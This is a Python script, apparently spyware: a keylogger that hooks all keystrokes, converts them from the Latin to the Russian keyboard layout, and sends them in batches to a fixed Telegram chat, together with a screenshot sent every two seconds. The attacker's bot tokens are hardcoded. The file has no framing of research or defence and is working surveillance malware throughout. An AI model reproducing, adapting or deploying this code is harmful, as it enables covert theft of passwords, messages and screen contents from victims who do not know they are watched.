import time

import keyboard
import pyautogui
import telebot

TOKEN = "1623818411:AAE4iAu4JqlqUgoMI85deLc1KV94rG-CVJY"
TOKEN_KE = "1880257035:AAF7WeZKMAy2Lg8BMmdR3QX-rGYoUAjZ0bI"


def kbr():
    def from_ghbdtn(text):
        layout = dict(
            zip(
                map(
                    ord,
                    """ qwertyuiop[]asdfghjkl;'zxcvbnm,./`QWERTYUIOP{}ASDFGHJKL:"ZXCVBNM<>?~""",
                ),
                """ йцукенгшщзхъфывапролджэячсмитьбю.ёЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ,Ё""",
            )
        )

        return text.translate(layout)

    while True:
        bot = telebot.TeleBot(TOKEN_KE)
        try:
            SendMessage = bot.send_message
            # keyboard_list = []
            keyboard_list = ""
            count = 0

            def print_pressed_keys(e):
                if e.event_type == "down":
                    nonlocal count, keyboard_list
                    count += 1
                    if e.name == "space":
                        keyboard_list += " "
                    else:
                        keyboard_list += e.name
                    if count > 100:
                        SendMessage(269019356, keyboard_list)
                        SendMessage(269019356, "r" + from_ghbdtn(keyboard_list))

                        keyboard_list = ""
                        count = 0

            keyboard.hook(print_pressed_keys)
            keyboard.wait()
        except Exception as e:
            bot.send_message(269019356, str(e))
            time.sleep(10)
            # print(e)


def scr():
    count = 0
    stats = []
    while True:
        bot = telebot.TeleBot(TOKEN)
        try:
            # now = time.time()
            count += 1
            bot.send_photo(269019356, pyautogui.screenshot())
            time.sleep(2)
            # end = time.time() - now
            # print(f'Executed time {end}')
            # stats.append(end)
        except Exception as e:
            # pass
            bot.send_message(269019356, str(e))
            time.sleep(10)
            # print(e)
